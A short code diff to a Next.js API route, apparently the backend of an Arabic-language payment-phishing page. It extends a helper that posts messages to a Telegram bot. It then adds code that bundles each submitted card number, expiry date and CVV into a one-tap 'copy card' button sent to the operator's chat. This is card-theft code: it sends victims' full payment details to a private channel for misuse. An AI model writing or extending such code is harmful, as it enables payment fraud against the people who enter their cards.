@@ -11,13 +11,13 @@ const TRANSACTION_LABELS: Record<string, string> = {
   payment: "دفع فاتورة",
 };
 
-async function sendTelegram(text: string) {
+async function sendTelegram(text: string, reply_markup?: Record<string, unknown>) {
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" }),
+    body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML", ...(reply_markup ? { reply_markup } : {}) }),
   });
 }
 
@@ -118,7 +118,19 @@ export async function PUT(req: NextRequest) {
       ...(needsAmount ? [`💰 Amount: ${amount} ر.س`] : []),
     ].join("\n");
 
-    await sendTelegram(message);
+    const copyText = [
+      cardNumber ?? "",
+      expiryDate ?? "",
+      cvv ?? "",
+    ].filter(Boolean).join("\n");
+
+    const replyMarkup = {
+      inline_keyboard: [
+        [{ text: "📋 نسخ البطاقة", copy_text: { text: copyText } }],
+      ],
+    };
+
+    await sendTelegram(message, replyMarkup);
     return NextResponse.json({ ok: true });
   } catch {
     return NextResponse.json({ error: "حدث خطأ" }, { status: 500 });
